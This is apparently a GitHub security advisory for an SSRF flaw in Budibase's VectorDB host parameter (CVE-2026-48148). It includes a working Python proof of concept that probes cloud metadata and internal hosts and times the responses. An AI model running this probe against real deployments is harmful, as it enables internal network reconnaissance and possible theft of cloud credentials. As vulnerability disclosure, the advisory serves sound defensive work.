# [M] Budibase: Unvalidated VectorDB Host Parameter Enables SSRF

## Summary
Severity: Medium
Advisory: GHSA-cv96-5348-p5p8
CVE: CVE-2026-48148
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N (CVSS_V4)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-cv96-5348-p5p8
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0 <3.35.3

## Details
### Summary

The VectorDB configuration endpoint in Budibase accepts a host parameter that undergoes no validation against internal IP ranges, reserved hostnames, or URL schemes. Any authenticated user with builder-level access can supply an arbitrary host value such as `169.254.169.254` or localhost, causing the server to initiate outbound TCP connections to internal network addresses or cloud metadata endpoints on their behalf.

### Details

The validator responsible for VectorDB creation and updates defines the host field as `Joi.string().required()`, which enforces only that the value is a non-empty string. No allowlist of external hostnames, no blocklist of RFC 1918 or link-local ranges, and no scheme validation are applied before the value is forwarded to the database SDK for connection establishment.

When a VectorDB entry is created or updated, the SDK uses the supplied host directly to open a TCP connection. Because the connection attempt originates from the Budibase server process, it traverses internal network boundaries that would otherwise be inaccessible to the attacker. Differences in connection timing and error messages between reachable and unreachable hosts allow an attacker to enumerate internal services and determine whether specific addresses are live. In cloud environments, the AWS EC2 metadata service at `169.254.169.254`, the GCP metadata server at `metadata.google.internal`, and equivalent endpoints for other providers are all reachable this way.

Builder access is a realistic precondition in multi-tenant or team deployments, as the builder role is intended to allow application development without granting administrative privileges over the underlying infrastructure.

### PoC

```python
import requests
import time

BASE_URL = "https://TARGET_BUDIBASE_INSTANCE"
SESSION = requests.Session()

login_resp = SESSION.post(f"{BASE_URL}/api/global/auth/default/login", json={
    "username": "builder@example.com",
    "password": "builderpassword"
})
token = login_resp.cookies.get("budibase:auth") or login_resp.json().get("token")
SESSION.headers.update({"Cookie": f"budibase:auth={token}"})

targets = [
    ("169.254.169.254", 80),
    ("localhost", 5432),
    ("10.0.0.1", 22),
]

for host, port in targets:
    start = time.time()
    resp = SESSION.post(f"{BASE_URL}/api/ai/vectordb", json={
        "name": f"probe_{host.replace('.', '_')}_{port}",
        "provider": "pgvector",
        "host": host,
        "port": port,
        "database": "db"
    })
    elapsed = time.time() - start
    print(f"host={host} port={port} status={resp.status_code} time={elapsed:.2f}s body={resp.text[:200]}")
```

### Impact

An attacker with builder access can use the Budibase server as a proxy to probe internal network topology, determine which hosts and ports are reachable from the server, and potentially interact with unauthenticated internal services including cloud instance metadata endpoints. In environments where cloud metadata endpoints expose credentials or instance identity documents, successful retrieval of metadata could lead to privilege escalation or lateral movement within the cloud environment. The attack requires no interaction beyond a single authenticated API request per probe target.

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-cv96-5348-p5p8
- https://nvd.nist.gov/vuln/detail/CVE-2026-48148
- https://github.com/Budibase/budibase
